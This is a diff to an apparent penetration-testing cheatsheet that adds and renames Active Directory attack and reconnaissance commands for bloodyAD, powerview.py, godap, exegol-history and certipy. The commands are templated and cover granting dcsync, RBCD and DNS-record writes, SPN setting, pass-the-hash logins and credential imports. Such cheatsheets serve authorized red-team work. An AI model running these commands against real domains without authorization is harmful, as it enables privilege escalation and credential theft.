@@ -15,7 +15,13 @@ bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add groupMember
 ## bloodyAD - set user spn
 #plateform/linux #target/remote #cat/ATTACK
 ```
-bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p <password> -k set object <target-user> serviceprincipalname -v '<service>/<spn>'[]
+bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p <password> -k set object <target-user> serviceprincipalname -v '<service>/<spn>'
+```
+
+## bloodyAD - set user attribute
+#plateform/linux #target/remote #cat/ATTACK
+```
+bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p <password> -k set object <target-user> <attribute> -v '<value>'
 ```
 
 ## bloodyAD - read gmsa password
@@ -66,10 +72,16 @@ bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add dcsync <tar
 bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add genericAll <target-user> <trustee>
 ```
 
-## bloodyAD - add rbcd
-#plateform/linux #target/remote #cat/ATTACK
+## bloodyad - add rbcd
+#plateform/linux #target/remote #cat/attack
 ```
 bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add rbcd <target-object> <service>
+```
+
+## bloodyad - add dnsRecord
+#plateform/linux #target/remote #cat/attack
+```
+bloodyAD --host <dc-fqdn> -u <user> -p <password> -d <domain> -k add dnsRecord <dns-name> <dns-data>
 ```
 
 ## bloodyAD - add shadow credential
@@ -186,33 +198,39 @@ mount -t "<type>" "<target-ip>":"<mount-point>" <directory> -o username="<user>"
 mount -t "<type>" "<target-ip>":"<mount-point>" <directory>
 ```
 
-## powerview - use
+## powerview.py - use
 #plateform/linux #target/remote #cat/RECON
 ```
 powerview "<domain>"/"<user>":"<password>"@"<dc-fqdn>" -k
 ```
 
-## powerview - use hash
+## powerview.py - use hash
 #plateform/linux #target/remote #cat/RECON
 ```
 powerview "<domain>"/"<user>":@"<dc-ip>" -H "<hash>"
 ```
-## powerview - use pfx
+## powerview.py - use pfx
 #plateform/linux #target/remote #cat/RECON
 ```
 powerview "<dc-ip>" --pfx "<pfx-file>"
 ```
 
-## powerview - relay mode
+## powerview.py - relay mode
 #plateform/linux #target/remote #cat/RECON
 ```
 powerview --relay --relay-host "<target-ip>"
 ```
 
-## powerview - find user description
+## powerview.py - find user description
 #plateform/linux #target/remote #cat/RECON
 ```
 powerview "<domain>"/"<user>":"<password>"@"<dc-fqdn>" -k  --query "Get-DomainUser -Where 'Description not \"\"' -Properties sAMAccountName,Description"
+```
+
+## powerview.py - find group membership
+#plateform/linux #target/remote #cat/RECON
+```
+powerview "<domain>"/"<user>":"<password>"@"<dc-fqdn>" -k  --query "Get-DomainGroup -Where 'member contains CN=Users' -Properties member,sAMAccountName"
 ```
 
 ## smbclient-ng - connect kerberos
@@ -227,6 +245,18 @@ smbng -d "<domain>" -u "<user>" -p "<password>" --ip "<target-ip>" --host "<dc-f
 smbng -d "<domain>" -u "<user>" -p "<password>" --host "<target-ip>"
 ```
 
+## godap - connect normal login
+#plateform/linux #target/remote #cat/RECON
+```
+godap <target-ip> -u <user> -p <password> -d <domain> -S -I
+```
+
+## godap - connect hash login
+#plateform/linux #target/remote #cat/RECON
+```
+godap <target-ip> -u <user> -H <hash> -d <domain> -S -I
+```
+
 ## exegol-history - add hosts
 #plateform/linux #target/remote #cat/CREDS
 ```
@@ -239,8 +269,15 @@ exh add hosts --ip <target-ip> -n <dc-fqdn> -r <role>
 exh add creds --ip <target-ip> -u <user> -H $(ntlm_hash <password>) -p <password> -d <domain>
 ```
 
+## exegol-history - import kdbx creds
+#plateform/linux #target/remote #cat/CREDS
+```
+exh import creds -f <kdbx-file> --format KDBX --kdbx-password <kdbx-password>
+```
+
 ## certipy - find vulnerable
 #plateform/linux #target/remote #cat/ATTACK
 ```
 certipy find -u "<user>"@"<domain>" -p "<password>" -dc-ip "<target-ip>" -k -ns "<dc-ip>" -target "<dc-fqdn>" -vulnerable -stdout
 ```
+
